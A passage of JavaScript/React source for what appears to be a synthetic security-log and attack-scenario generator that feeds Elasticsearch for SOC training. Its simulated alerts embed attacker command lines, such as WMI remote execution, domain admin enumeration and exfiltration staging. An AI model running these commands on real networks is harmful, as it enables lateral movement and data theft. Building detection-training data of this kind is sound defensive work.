    makeAlert(t(900),{ruleName:'WMI Remote Process Execution (Lateral Movement)',severity:'critical',riskScore:87,tactic:'Lateral Movement',technique:'T1021.006',techniqueName:'Windows Remote Management',host:v2,user:u1,proc:{name:'wmic.exe',cmd:`wmic.exe /node:"${ctx.secondHost.ip}" /user:"CONTOSO\\${u1.name}" process call create "cmd.exe /c ipconfig /all & net user > C:\\Temp\\out.txt"`,parent:'cmd.exe'}}),
    makeAlert(t(1200),{ruleName:'Domain Controller and Admin Group Enumeration',severity:'medium',riskScore:47,tactic:'Discovery',technique:'T1018',techniqueName:'Remote System Discovery',host:v2,user:u1,proc:{name:'net.exe',cmd:'net.exe group "Domain Controllers" /domain & net.exe group "Enterprise Admins" /domain',parent:'cmd.exe'}}),
    makeAlert(t(1500),{ruleName:'Data Archive Created Using Built-in Compression',severity:'high',riskScore:67,tactic:'Collection',technique:'T1560.001',techniqueName:'Archive via Utility',host:v1,user:u1,proc:{name:'powershell.exe',cmd:`Compress-Archive -Path "${ctx.stagingDir}*" -DestinationPath C:\\Windows\\Temp\\logs_backup.zip -Force`,parent:'wscript.exe'}}),
    makeAlert(t(1800),{ruleName:'Anomalous HTTPS Transfer to Non-Corporate IP',severity:'critical',riskScore:91,tactic:'Exfiltration',technique:'T1048.003',techniqueName:'Exfiltration Over Unencrypted Protocol',host:v1,user:u1,net:{ip:ctx.c2IP,port:443},extra:{network:{bytes:rand(10485760,78643200)},url:{domain:ctx.c2Domain}}}),
  ];
  return{meta:{name:'APT — Living off the Land',attackerProfile:'Sophisticated threat actor (no custom malware)',targetOrg:'Enterprise',description:'Fileless intrusion using only Windows built-in utilities: certutil → mshta → schtasks → log clearing → token privilege abuse → NTDS dump → WMI lateral movement → data exfiltration. No malware dropped.',timeRange:{from:t(0),to:t(1800)}},ctx,alerts};
}

function generateScenarioNoise(level,tr=120){
  if(!level||level==='off')return{};
  const conf={
    low:   {windows:80, endpoint:50, fortinet:120},
    medium:{windows:200,endpoint:120,fortinet:300,email:40, linux:60},
    high:  {windows:500,endpoint:300,fortinet:600,email:100,linux:150,paloalto:200},
  }[level]||{};
  const noise={};
  setPool(level==='high'?20:level==='medium'?10:5);
  Object.entries(conf).forEach(([vid,count])=>{const v=VENDORS.find(x=>x.id===vid);if(v)noise[vid]=v.generator(count,tr);});
  setPool(null);
  return noise;
}

// Generates firewall + endpoint logs that directly corroborate the attack scenario.
// Uses real IOCs from ctx so SOC investigation searches find them.
// Also includes 2 additional internal hosts connecting to the same C2 — surfaces
// lateral reach and gives the automated workflow multiple endpoints to investigate.
function generateScenarioCoreLogs(ctx, timeRange){
  const from=timeRange?.from||new Date(Date.now()-4*3600000);
  const to=timeRange?.to||new Date();
  const span=Math.max(to-from,60000);
  const rndTs=()=>new Date(from.getTime()+Math.random()*span);

  // 2 other internal hosts that also communicated with the C2
  const otherHosts=[
    {ip:`192.168.${rand(10,15)}.${rand(20,80)}`,name:_HOSTNAMES_BASE(),user:pick(_USERS_LIST)},
    {ip:`192.168.${rand(16,20)}.${rand(20,80)}`,name:_HOSTNAMES_BASE(),user:pick(_USERS_LIST)},
  ];
  const victim={ip:ctx.victim.ip,name:ctx.victim.hostname,user:ctx.victim.user};
  const allSrcs=[victim,...otherHosts];
  const logs={paloalto:[],fortinet:[],endpoint:[],windows:[]};

  // ── Palo Alto ──
  const panC2Traffic=(src,dstIp,t,bytes)=>{
    const dev=pick(PAN_DEVICES),pt=panTs(t);
    const st=new Date(t.getTime()-rand(30000,300000)),pst=panTs(st);
    const b=bytes||rand(4096,65536),bs=Math.floor(b*0.3),br=b-bs,pk=rand(10,500);
    return `<14>${syslogTimestamp(t)} ${dev} 1,${pt},${PAN_SERIAL},TRAFFIC,end,0,${pt},${src.ip},${dstIp},0.0.0.0,0.0.0.0,allow-internet,${src.user},,ssl,vsys1,trust,untrust,ethernet1/1,ethernet1/2,default,0,${rand(1,65535)},1,${randomHighPort()},443,0,0,0x400000,tcp,allow,${b},${bs},${br},${pk},${pst},${Math.floor((t-st)/1000)},any,0,${rand(1000000,9999999)},0x0,192.168.0.0-192.168.255.255,Russia,0,${Math.floor(pk*0.4)},${pk-Math.floor(pk*0.4)},tcp-fin,0,0,0,0,vsys1,${dev},from-policy`;
  };
  const panC2Threat=(src,dstIp,t)=>{
    const dev=pick(PAN_DEVICES),pt=panTs(t);
    return `<11>${syslogTimestamp(t)} ${dev} 1,${pt},${PAN_SERIAL},THREAT,spyware,0,${pt},${src.ip},${dstIp},0.0.0.0,0.0.0.0,Block-Critical,,${src.user},ssl,vsys1,trust,untrust,ethernet1/1,ethernet1/2,default,0,${rand(1,65535)},1,${randomHighPort()},443,0,0,0x0,tcp,alert,"Generic C2 HTTPS Traffic(12345)",12345,command-and-control,high,client-to-server,${rand(1000000,9999999)},0x0,192.168.0.0-192.168.255.255,Russia`;
  };
  // Victim: multiple C2 beacons + large exfil burst
  for(let i=0;i<8;i++){
    const t=rndTs(),dst=i%3===0?ctx.c2IP2:ctx.c2IP;
    const bytes=i===7?rand(52428800,104857600):undefined;
    logs.paloalto.push(i%4===0?panC2Threat(victim,dst,t):panC2Traffic(victim,dst,t,bytes));
  }
  // Other hosts → same C2 (shows blast radius)
  otherHosts.forEach(h=>logs.paloalto.push(panC2Traffic(h,ctx.c2IP,rndTs())));

  // ── Fortinet ──
  const fortiC2Traffic=(src,dstIp,t)=>{
    const hn=`FGT-${pick(['DC','EDGE','CORE'])}-${rand(1,5)}`,b=rand(4096,524288);
    return `date=${t.toISOString().split('T')[0]} time=${t.toTimeString().split(' ')[0]} devname="${hn}" eventtime=${Math.floor(t/1000)} logid="000001${rand(1000,9999)}" type="traffic" subtype="forward" level="notice" srcip=${src.ip} srcport=${randomHighPort()} dstip=${dstIp} dstport=443 action="accept" policyname="allow-outbound" service="HTTPS" sentbyte=${Math.floor(b*0.3)} rcvdbyte=${b-Math.floor(b*0.3)} hostname="${ctx.c2Domain}" dstcountry="Russia" app="ssl" user="${src.user}"`;
  };
  const fortiC2Alert=(src,dstIp,t)=>{
    const hn=`FGT-${pick(['DC','EDGE'])}-${rand(1,3)}`;
    return `date=${t.toISOString().split('T')[0]} time=${t.toTimeString().split(' ')[0]} devname="${hn}" eventtime=${Math.floor(t/1000)} logid="042${rand(10000,99999)}" type="utm" subtype="app-ctrl" level="alert" srcip=${src.ip} dstip=${dstIp} action="detected" hostname="${ctx.c2Domain}" attack="C2.Beacon.APT29" severity="critical" msg="Known APT29 C2 domain contact detected" user="${src.user}"`;
  };
  allSrcs.forEach((src,i)=>{
    logs.fortinet.push(i===0?fortiC2Alert(src,ctx.c2IP,rndTs()):fortiC2Traffic(src,ctx.c2IP,rndTs()));
    if(i===0){
      logs.fortinet.push(fortiC2Traffic(src,ctx.c2IP,rndTs()));
      logs.fortinet.push(fortiC2Traffic(src,ctx.c2IP2,rndTs()));
    }
  });

  // ── Endpoint network events ──
  const epC2=(src,dstIp,t)=>JSON.stringify({
    '@timestamp':formatTimestamp(t),
    event:{kind:'event',category:['network'],type:['connection'],action:'network_flow'},
    host:{name:src.name,hostname:src.name,ip:[src.ip]},
    source:{ip:src.ip,port:randomHighPort()},
    destination:{ip:dstIp,port:443,domain:ctx.c2Domain},
    network:{transport:'tcp',direction:'outbound',bytes:rand(4096,65536)},
    process:{name:src===victim?(ctx.malwareFile||'svchost.exe'):pick(['svchost.exe','msedge.exe','powershell.exe']),pid:rand(1000,65535)},
    user:{name:src.user},
    threat:{enrichments:[{indicator:{ip:dstIp,domain:ctx.c2Domain,type:'domain-name',provider:'CISA'}}]},
  });
  allSrcs.forEach(src=>logs.endpoint.push(epC2(src,ctx.c2IP,rndTs())));
  logs.endpoint.push(epC2(victim,ctx.c2IP2,rndTs()));

  // ── Windows DNS-Client/Operational Event 22 ──
  // Event ID 22 = DNS Query Response Completed — maps domain → IP in the log corpus
  // so the SOC agent can resolve C2 domains without relying on external DNS tools.
  const dnsQueryLog=(host,domain,resolvedIp,t)=>JSON.stringify({
    '@timestamp':formatTimestamp(t),
    winlog:{
      event_id:22,
      channel:'Microsoft-Windows-DNS-Client/Operational',
      computer_name:`${host.name}.contoso.com`,
      provider_name:'Microsoft-Windows-DNS-Client',
      record_id:rand(10000,9999999),
      event_data:{QueryName:domain,QueryResults:`type:  1 ${resolvedIp};`,QueryOptions:'1073774080'},
    },
    event:{code:'22',action:'dns-query-response',category:['network'],type:['info'],kind:'event',outcome:'success'},
    host:{name:host.name,hostname:host.name,ip:[host.ip]},
    // ECS dns fields — directly queryable by the agent
    dns:{
      question:{name:domain,type:'A',registered_domain:domain.split('.').slice(-2).join('.')},
      answers:[{name:domain,data:resolvedIp,type:'A',ttl:300}],
      resolved_ip:[resolvedIp],
      response_code:'NOERROR',
    },
    // Also populate destination so firewall-style queries match
    destination:{ip:resolvedIp,address:resolvedIp},
    related:{hosts:[domain],ip:[resolvedIp,host.ip]},
    user:{name:host.user},
  });

  // Victim resolves both C2 domain and phishing domain
  logs.windows.push(dnsQueryLog(victim,ctx.c2Domain,ctx.c2IP,rndTs()));
  logs.windows.push(dnsQueryLog(victim,ctx.phishingDomain,ctx.attacker?.ip||ctx.c2IP,rndTs()));
  // Other compromised hosts also resolve the same C2 domain (corroborates lateral reach)
  otherHosts.forEach(h=>logs.windows.push(dnsQueryLog(h,ctx.c2Domain,ctx.c2IP,rndTs())));

  return logs;
}

// ─── Elastic Config ───────────────────────────────────────────────────────────
const STORAGE_KEY='elastic_config_forge';
function loadConfig(){try{return JSON.parse(localStorage.getItem(STORAGE_KEY)||'null');}catch{return null;}}
function saveConfig(c){localStorage.setItem(STORAGE_KEY,JSON.stringify(c));}
function buildHeaders(cfg){return {'Content-Type':'application/x-ndjson','Authorization':`ApiKey ${cfg.apiKey}`};}

// ─── elasticIngest ────────────────────────────────────────────────────────────
function agentField(type){return{type,version:'8.13.0',ephemeral_id:Math.random().toString(36).slice(2)};}
function dsField(dataset){return{type:'logs',dataset,namespace:'default'};}
const VENDOR_INGEST={
  fortinet:{getIndex(l){if(l.includes('type="utm"'))return'logs-fortinet.fortigate.utm-default';if(l.includes('subtype="vpn"'))return'logs-fortinet.fortigate.event-default';return'logs-fortinet.fortigate.traffic-default';},toDoc(l){
    const ds=l.includes('type="utm"')?'fortinet.fortigate.utm':l.includes('subtype="vpn"')?'fortinet.fortigate.event':'fortinet.fortigate.traffic';
    const et=l.match(/eventtime=(\d+)/);
    const ts=et?new Date(parseInt(et[1])*1000).toISOString():new Date().toISOString();
    // Parse all key=value pairs (quoted and unquoted) into a flat map
    const kv={};
    l.replace(/(\w+)="([^"]*)"/g,(_,k,v)=>{kv[k]=v;});
    l.replace(/(?:^|\s)(\w+)=([^\s"]+)/g,(_,k,v)=>{if(!kv[k])kv[k]=v;});
    const srcIp=kv.srcip,dstIp=kv.dstip,hostname=kv.hostname;
    return{
      '@timestamp':ts,message:l,
      event:{dataset:ds,module:'fortinet',kind:'event',action:kv.action,outcome:kv.action==='accept'||kv.action==='allow'?'success':'failure',original:l},
      observer:{vendor:'Fortinet',product:'FortiGate',type:'firewall'},
      ...(srcIp?{source:{ip:srcIp,address:srcIp,...(kv.srcport?{port:parseInt(kv.srcport)}:{})}}:{}),
      ...(dstIp?{destination:{ip:dstIp,address:hostname||dstIp,...(kv.dstport?{port:parseInt(kv.dstport)}:{}),...(hostname?{domain:hostname}:{}),...(kv.dstcountry?{geo:{country_name:kv.dstcountry}}:{})}}:{}),
      ...(kv.user?{user:{name:kv.user}}:{}),
      network:{transport:'tcp',...(kv.app?{application:kv.app}:{})},
      agent:agentField('filebeat'),data_stream:dsField(ds),
    };
  }},
  paloalto:{getIndex(){return'logs-panw.panos-5.5.0';},toDoc(l){
    const cols=l.split(',');
    // cols[0]=syslog_hdr+FUTURE_USE(1), cols[1]=recv_time, cols[2]=serial, cols[3]=type
    // cols[7]=src_ip, cols[8]=dst_ip, cols[12]=src_user, cols[24]=src_port, cols[25]=dst_port
    const lt=cols[3]||'TRAFFIC';
    let ts=new Date().toISOString();
    if(cols[1]){const m=cols[1].trim().match(/^(\d{4})\/(\d{2})\/(\d{2}) (\d{2}):(\d{2}):(\d{2})$/);if(m)ts=new Date(`${m[1]}-${m[2]}-${m[3]}T${m[4]}:${m[5]}:${m[6]}Z`).toISOString();}
    const srcIp=cols[7]?.trim(),dstIp=cols[8]?.trim();
    const srcPort=cols[24]?parseInt(cols[24]):undefined,dstPort=cols[25]?parseInt(cols[25]):undefined;
    const srcUser=(cols[12]?.trim()||'').replace(/^,+|,+$/g,'')||undefined;
    return{
      '@timestamp':ts,message:l,
      event:{dataset:'panw.panos',module:'panw',kind:lt==='THREAT'?'alert':'event',original:l},
      observer:{vendor:'Palo Alto Networks',product:'PAN-OS',type:'firewall'},
      ...(srcIp&&srcIp!=='0.0.0.0'?{source:{ip:srcIp,address:srcIp,...(srcPort?{port:srcPort}:{})}}:{}),
      ...(dstIp&&dstIp!=='0.0.0.0'?{destination:{ip:dstIp,address:dstIp,...(dstPort?{port:dstPort}:{})}}:{}),
      ...(srcUser?{user:{name:srcUser}}:{}),
      network:{transport:cols[29]?.trim()||'tcp'},
      agent:agentField('filebeat'),data_stream:dsField('panw.panos'),
    };
  }},
  switch:{getIndex(){return'logs-cisco.ios-default';},toDoc(l){const tm=l.match(/>(\w{3}\s+\d+\s+\d{2}:\d{2}:\d{2})/);const ts=tm?new Date(tm[1]+' '+new Date().getFullYear()).toISOString():new Date().toISOString();return{'@timestamp':ts,message:l,event:{dataset:'cisco.ios',module:'cisco',kind:'event',original:l},observer:{vendor:'Cisco',product:'Catalyst IOS',type:'switch'},agent:agentField('filebeat'),data_stream:dsField('cisco.ios')};}},
  email:{getIndex(l){if(l.trimStart().startsWith('{'))return'logs-o365.audit-default';if(l.includes('postfix/')||l.includes('NOQUEUE'))return'logs-system.syslog-default';return'logs-microsoft_exchange_server.log-default';},toDoc(l){let ds='microsoft_exchange_server.log',ts=new Date().toISOString();if(l.trimStart().startsWith('{')){try{const o=JSON.parse(l);ds='o365.audit';ts=o.CreationTime||ts;}catch{}}else if(l.includes('postfix/')){ds='system.syslog';}return{'@timestamp':ts,message:l,event:{dataset:ds,module:ds.split('.')[0],category:['email'],original:l},agent:agentField('filebeat'),data_stream:dsField(ds)};}},
  endpoint:{getIndex(l){try{const o=JSON.parse(l);if(o.event?.kind==='alert')return'logs-endpoint.alerts-default';if((o.event?.category||[]).includes('network'))return'logs-endpoint.events.network-default';}catch{}return'logs-endpoint.events.process-default';},toDoc(l){try{const o=JSON.parse(l);const cats=o.event?.category||[];let ds='endpoint.events.process';if(o.event?.kind==='alert')ds='endpoint.alerts';else if(cats.includes('network'))ds='endpoint.events.network';return{...o,agent:{...o.agent,type:'endpoint'},data_stream:dsField(ds),event:{...o.event,dataset:ds,module:'endpoint'}};}catch{return{'@timestamp':new Date().toISOString(),message:l,event:{dataset:'endpoint.events.process'},agent:agentField('elastic_agent'),data_stream:dsField('endpoint.events.process')};}}},
  windows:{
    getIndex(l){try{const o=JSON.parse(l),ch=o.winlog?.channel||'';if(ch.includes('PowerShell'))return'logs-windows.powershell_operational-default';if(ch==='Security')return'logs-windows.security-default';if(ch==='Application')return'logs-windows.application-default';if(ch.includes('AppLocker'))return'logs-windows.applocker-default';return'logs-windows.system-default';}catch{return'logs-windows.system-default';}},
    toDoc(l){try{const o=JSON.parse(l);const ch=o.winlog?.channel||'System';let ds='windows.system';if(ch.includes('PowerShell'))ds='windows.powershell_operational';else if(ch==='Security')ds='windows.security';else if(ch==='Application')ds='windows.application';else if(ch.includes('AppLocker'))ds='windows.applocker';return{...o,event:{...o.event,dataset:ds,module:'windows'},agent:agentField('winlogbeat'),data_stream:dsField(ds)};}catch{return{'@timestamp':new Date().toISOString(),message:l,event:{dataset:'windows.system',module:'windows'},agent:agentField('winlogbeat'),data_stream:dsField('windows.system')};}}
  },
  linux:{getIndex(l){if(l.includes('sshd[')||l.includes('sudo:'))return'logs-system.auth-default';if(l.includes('audit['))return'logs-auditd.log-default';return'logs-system.syslog-default';},toDoc(l){let ds='system.syslog';if(l.includes('sshd[')||l.includes('sudo:'))ds='system.auth';else if(l.includes('audit['))ds='auditd.log';const ts=l.match(/^(\w{3}\s+\d+\s+\d{2}:\d{2}:\d{2})/);return{'@timestamp':ts?new Date(ts[1]+' '+new Date().getFullYear()).toISOString():new Date().toISOString(),message:l,event:{dataset:ds,module:ds.split('.')[0],original:l},agent:agentField('filebeat'),data_stream:dsField(ds)};}},
};

async function pushLogsToElastic(logs,indexOverrides={}){
  const cfg=loadConfig();if(!cfg?.url)throw new Error('No Elasticsearch config found');
  const idxCounts={},bulkLines=[];
  for(const[vid,rawLogs]of Object.entries(logs)){const ing=VENDOR_INGEST[vid];if(!ing)continue;const override=indexOverrides[vid]?.trim()||null;for(const raw of rawLogs){const idx=override||ing.getIndex(raw);const doc=JSON.parse(JSON.stringify(ing.toDoc(raw)));bulkLines.push(JSON.stringify({create:{_index:idx}}));bulkLines.push(JSON.stringify(doc));idxCounts[idx]=(idxCounts[idx]||0)+1;}}
  if(bulkLines.length===0)throw new Error('No logs to push');
  const res=await fetch(`${cfg.url.replace(/\/$/,'')}/_bulk`,{method:'POST',headers:buildHeaders(cfg),body:bulkLines.join('\n')+'\n'});
  if(!res.ok)throw new Error(`HTTP ${res.status}: ${res.statusText}`);
  const data=await res.json();const total=bulkLines.length/2;const errs=data.items?.filter(i=>i.create?.error||i.index?.error).length||0;
  return{total,errors:errs,indices:idxCounts};
}

// ─── VENDORS config ───────────────────────────────────────────────────────────
const VENDORS=[
  {id:'fortinet',name:'Fortinet FortiGate',description:'Traffic, UTM/IPS, and SSL VPN events',tags:['Firewall','UTM','VPN','IPS'],indices:['logs-fortinet.fortigate.traffic-default','logs-fortinet.fortigate.utm-default'],generator:generateFortinetLogs},
  {id:'paloalto',name:'Palo Alto Networks',description:'PAN-OS traffic and threat logs in CSV syslog format',tags:['NGFW','Threat','Traffic','WildFire'],indices:['logs-panw.panos-5.5.0'],generator:generatePaloAltoLogs},
  {id:'switch',name:'Cisco Switches',description:'IOS syslog: link state, STP, 802.1X, OSPF',tags:['Switch','STP','NAC','OSPF'],indices:['logs-cisco.ios-default'],generator:generateSwitchLogs},
  {id:'email',name:'E-Mail Systems',description:'Exchange tracking, Postfix MTA, and O365 audit logs',tags:['Exchange','Postfix','O365','Phishing'],indices:['logs-o365.audit-default','logs-microsoft_exchange_server.log-default'],generator:generateEmailLogs},
  {id:'endpoint',name:'Endpoint Telemetry',description:'EDR-style process, network, and alert events with MITRE ATT&CK',tags:['EDR','Process','MITRE','Alerts'],indices:['logs-endpoint.events.process-default','logs-endpoint.alerts-default'],generator:generateEndpointLogs},
  {id:'windows',name:'Windows Events',description:'Security (4624/4625), Application, System, AppLocker and PowerShell event logs via winlogbeat',tags:['Security','PowerShell','Logon','AppLocker'],indices:['logs-windows.security-default','logs-windows.application-default','logs-windows.system-default','logs-windows.powershell_operational-default','logs-windows.applocker-default'],generator:generateWindowsEventLogs},
  {id:'linux',name:'Linux / Syslog',description:'SSH auth, sudo, auditd syscalls, cron, and systemd',tags:['SSH','Auditd','Sudo','Syslog'],indices:['logs-system.auth-default','logs-auditd.log-default'],generator:generateLinuxLogs},
];
const SCENARIOS=[
  {id:'apt29',name:'APT29 — Midnight Blizzard',description:'State-sponsored: OAuth phishing → persistence → credential dump → lateral movement → C2 → exfiltration. Generates Kibana security alerts for Attack Discovery.',severity:'critical',type:'apt',tactics:['Initial Access','Execution','Persistence','Defense Evasion','Credential Access','Discovery','Lateral Movement','Collection','Command and Control','Exfiltration'],generator:generateAPT29Scenario},
  {id:'lotl',name:'APT — Living off the Land',description:'Fileless attack using only Windows built-in tools: certutil → mshta → schtasks → log clearing → NTDS dump → WMI → exfil. Generates Kibana security alerts for Attack Discovery.',severity:'critical',type:'apt',tactics:['Execution','Persistence','Defense Evasion','Privilege Escalation','Credential Access','Discovery','Lateral Movement','Collection','Exfiltration'],generator:generateLotLScenario},
  {id:'phishing',name:'Phishing Attack',description:'Spearphishing email → file download → execution → C2 beacon. Full Initial Access → Execution → C2 chain.',severity:'critical',type:'raw',tactics:['Initial Access','Execution','Command & Control'],generator:generatePhishingScenario},
  {id:'phishing-lateral',name:'Phishing + Lateral Movement',description:'Phishing compromise → LSASS dump via Mimikatz → Pass-the-Hash → PsExec lateral movement to second host.',severity:'critical',type:'raw',tactics:['Initial Access','Credential Access','Lateral Movement'],generator:generatePhishingLateralScenario},
  {id:'exfiltration',name:'Data Exfiltration',description:'File staging → 7-Zip password archive → HTTPS upload + DNS tunneling → audit log cleared.',severity:'critical',type:'raw',tactics:['Collection','Exfiltration','Defense Evasion'],generator:generateExfiltrationScenario},
  {id:'ransomware',name:'Ransomware Outbreak',description:'Office macro → encoded PowerShell → VSS deletion → mass file encryption → EternalBlue SMB spread.',severity:'critical',type:'raw',tactics:['Execution','Impact','Lateral Movement'],generator:generateRansomwareScenario},
];

// ─── UI Components ────────────────────────────────────────────────────────────
const cn=(...args)=>args.filter(Boolean).join(' ');

function Badge({children,className}){return <span className={cn("inline-flex items-center px-1.5 py-0.5 rounded text-[10px] font-medium border",className)}>{children}</span>;}
function Button({children,onClick,disabled,className,size='md',variant='default'}){const base="inline-flex items-center justify-center font-medium rounded transition-all focus:outline-none";const sizes={sm:"h-7 px-2.5 text-xs",md:"h-9 px-4 text-sm"};const variants={default:"bg-blue-600 hover:bg-blue-700 text-white disabled:opacity-50",outline:"border border-gray-600 text-gray-300 hover:border-gray-400 hover:text-white disabled:opacity-50",ghost:"text-gray-400 hover:text-white hover:bg-gray-700 disabled:opacity-50"};return <button onClick={onClick} disabled={disabled} className={cn(base,sizes[size],variants[variant],className)}>{children}</button>;}

// Config Dialog
function ConfigDialog({open,onClose,onSave}){
  const [cfg,setCfg]=useState({url:'',apiKey:'',kibanaUrl:''});
  const [status,setStatus]=useState(null);
  const [err,setErr]=useState('');
  const [showCurl,setShowCurl]=useState(false);
  useEffect(()=>{if(open){const s=loadConfig();if(s)setCfg({url:s.url||'',apiKey:s.apiKey||'',kibanaUrl:s.kibanaUrl||''});}},[open]);
  const upd=(k,v)=>setCfg(c=>({...c,[k]:v}));
  const test=async()=>{setStatus('testing');setErr('');try{const r=await fetch(`${cfg.url.replace(/\/$/,'')}/_cluster/health`,{headers:buildHeaders(cfg),mode:'cors'});if(r.ok){const d=await r.json();setStatus('ok');setErr(`Cluster: ${d.cluster_name} — ${d.status}`);}else{setStatus('error');setErr(`HTTP ${r.status}: ${r.statusText}`);}}catch(e){setStatus('error');setErr(e.message==='Failed to fetch'?'CORS_ERROR':e.message);}};
  const save=()=>{saveConfig(cfg);onSave(cfg);onClose();};
  const curl=`curl -k -H "Authorization: ApiKey ${cfg.apiKey}" "${cfg.url.replace(/\/$/,'')}/_cluster/health?pretty"`;
  if(!open)return null;
  return(
    <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
      <div className="bg-gray-900 border border-gray-700 rounded-xl w-full max-w-lg">
        <div className="flex items-center gap-2 p-5 border-b border-gray-700">
          <svg className="w-5 h-5 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 7v10c0 2 1 3 3 3h10c2 0 3-1 3-3V7c0-2-1-3-3-3H7C5 4 4 5 4 7z"/><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6M9 16h4"/></svg>
          <h2 className="text-white font-semibold">Elasticsearch Connection</h2>
          <button onClick={onClose} className="ml-auto text-gray-400 hover:text-white">✕</button>
        </div>
        <div className="p-5 space-y-4">
          {[['Cluster URL','url','https://my-cluster.es.io:9200'],['API Key','apiKey','Base64-encoded API key'],['Kibana URL (optional)','kibanaUrl','https://my-cluster.kb.io:5601']].map(([label,key,ph])=>(
            <div key={key} className="space-y-1.5">
              <label className="text-xs text-gray-400 font-medium">{label}</label>
              <input type={key==='apiKey'?'password':'text'} value={cfg[key]} onChange={e=>upd(key,e.target.value)} placeholder={ph} className="w-full bg-gray-800 border border-gray-600 rounded-lg px-3 py-2 text-sm font-mono text-gray-200 focus:outline-none focus:border-blue-500"/>
            </div>
          ))}
          {status==='ok'&&<div className="flex gap-2 p-2.5 rounded-lg bg-green-500/10 border border-green-500/30 text-xs text-green-400">✓ Connected! {err}</div>}
          {status==='error'&&err==='CORS_ERROR'&&(
            <div className="p-3 rounded-lg bg-amber-500/10 border border-amber-500/30 text-xs text-amber-300 space-y-2">
              <p className="font-medium">⚠ CORS is blocking direct browser requests</p>
              <p className="text-amber-300/80">Config saved — use the curl command below to verify from your terminal.</p>
              <button onClick={()=>setShowCurl(!showCurl)} className="underline text-amber-400">{showCurl?'Hide':'Show'} test command</button>
              {showCurl&&<pre className="bg-gray-900 p-2 rounded text-[11px] whitespace-pre-wrap break-all mt-1">{curl}</pre>}
            </div>
          )}
          {status==='error'&&err!=='CORS_ERROR'&&<div className="flex gap-2 p-2.5 rounded-lg bg-red-500/10 border border-red-500/30 text-xs text-red-400">✗ {err||'Connection failed'}</div>}
          {status===null&&<div className="flex gap-2 p-2.5 rounded-lg bg-gray-800 border border-gray-700 text-xs text-gray-400">ℹ Elastic Cloud blocks browser connections (CORS). Save config and use curl or NDJSON download to ingest logs.</div>}
          <div className="flex gap-2 pt-1">
            <Button variant="outline" onClick={test} disabled={!cfg.url||!cfg.apiKey||status==='testing'} className="flex-1">{status==='testing'?'Testing…':'Test Connection'}</Button>
            <Button onClick={save} disabled={!cfg.url} className="flex-1">Save Config</Button>
          </div>
        </div>
      </div>
    </div>
  );
}

// Vendor Card
const WIN_TYPE_LABELS={security:'Security',application:'Application',system:'System',applocker:'AppLocker',powershell:'PowerShell'};
function VendorCard({vendor,selected,onToggle,integrationMissing,randomness,onRandomness,minLogs,onMinLogs,emailDomain,onEmailDomain,windowsLogTypes,onWindowsLogTypes,hostnamePrefix,onHostnamePrefix,hostnameCap,onHostnameCap,includeAdmin,onIncludeAdmin,indexOverride,onIndexOverride}){
  return(
    <div onClick={()=>onToggle(vendor.id)} className={cn("relative cursor-pointer p-4 rounded-xl border-2 transition-all",selected?"border-blue-500 bg-blue-500/10 shadow-lg shadow-blue-500/10":"border-gray-700 hover:border-gray-500 bg-gray-900/60")}>
      {selected&&<div className="absolute top-2 right-2 w-5 h-5 rounded-full bg-blue-500 flex items-center justify-center"><span className="text-white text-[10px]">✓</span></div>}
      <div className={cn("w-9 h-9 rounded-lg flex items-center justify-center mb-2.5 text-sm",selected?"bg-blue-500/20":"bg-gray-800")}>
        {vendor.id==='fortinet'?'🛡'
        :vendor.id==='paloalto'?'🔥'
        :vendor.id==='switch'?'🌐'
        :vendor.id==='email'?'✉️'
        :vendor.id==='endpoint'?'💻'
        :vendor.id==='windows'?'🪟'
        :'🐧'}
      </div>
      <h3 className="font-semibold text-sm text-white mb-0.5">{vendor.name}</h3>
      <p className="text-xs text-gray-400 mb-2.5 line-clamp-2">{vendor.description}</p>
      <div className="flex flex-wrap gap-1">
        {vendor.tags.map(t=><Badge key={t} className="border-gray-600 text-gray-400">{t}</Badge>)}
      </div>
      {selected&&(
        <div className="mt-2.5 pt-2.5 border-t border-blue-500/20" onClick={e=>e.stopPropagation()}>
          <div className="flex items-center gap-1 mb-2">
            <span className="text-[10px] text-gray-500 flex-1">Randomness</span>
            {['low','med','high'].map(lvl=>(
              <button key={lvl} onClick={()=>onRandomness(vendor.id,lvl)} className={cn("px-2 py-0.5 rounded text-[10px] font-medium transition-colors",randomness===lvl?"bg-blue-500 text-white":"bg-gray-700/80 text-gray-400 hover:bg-gray-600 hover:text-white")}>
                {lvl.charAt(0).toUpperCase()+lvl.slice(1)}
              </button>
            ))}
          </div>
          <div className="flex items-center gap-2 mb-2">
            <label className="text-[10px] text-gray-500 flex-1">Min logs</label>
            <input type="number" min="1" value={minLogs} onChange={e=>onMinLogs(vendor.id,e.target.value)} className="w-20 bg-gray-900 border border-gray-600 rounded px-2 py-0.5 text-xs font-mono text-gray-200 focus:outline-none focus:border-blue-500 text-right"/>
          </div>
          {vendor.id==='email'&&(
            <div className="mb-2">
              <label className="text-[10px] text-gray-500 block mb-1">Custom domain (@ suffix)</label>
              <input type="text" value={emailDomain} onChange={e=>onEmailDomain(e.target.value)} placeholder="e.g. acme.com" className="w-full bg-gray-900 border border-gray-600 rounded px-2 py-1 text-xs font-mono text-gray-200 focus:outline-none focus:border-blue-500"/>
            </div>
          )}
          {(vendor.id==='windows'||vendor.id==='linux'||vendor.id==='endpoint')&&(
            <div className="mb-2 space-y-1.5">
              <div>
                <label className="text-[10px] text-gray-500 block mb-1">Hostname prefix <span className="text-gray-600">(optional)</span></label>
                <input type="text" value={hostnamePrefix||''} onChange={e=>onHostnamePrefix(vendor.id,e.target.value)} placeholder={vendor.id==='windows'?'e.g. CORP-WIN':vendor.id==='linux'?'e.g. app-server':'e.g. DESKTOP'} className="w-full bg-gray-900 border border-gray-600 rounded px-2 py-1 text-xs font-mono text-gray-200 focus:outline-none focus:border-blue-500"/>
                {hostnamePrefix&&<p className="text-[9px] text-blue-400/70 mt-0.5">→ {hostnamePrefix}-001, {hostnamePrefix}-002…</p>}
              </div>
              <div className="flex items-center gap-2">
                <label className="text-[10px] text-gray-500 flex-1">Max unique hosts</label>
                <input type="number" min="1" max="500" value={hostnameCap??''} onChange={e=>onHostnameCap(vendor.id,e.target.value)} placeholder={String(VENDOR_POOL[vendor.id]?.[randomness]??'∞')} className="w-16 bg-gray-900 border border-gray-600 rounded px-2 py-0.5 text-xs font-mono text-gray-200 focus:outline-none focus:border-blue-500 text-right"/>
              </div>
            </div>
          )}
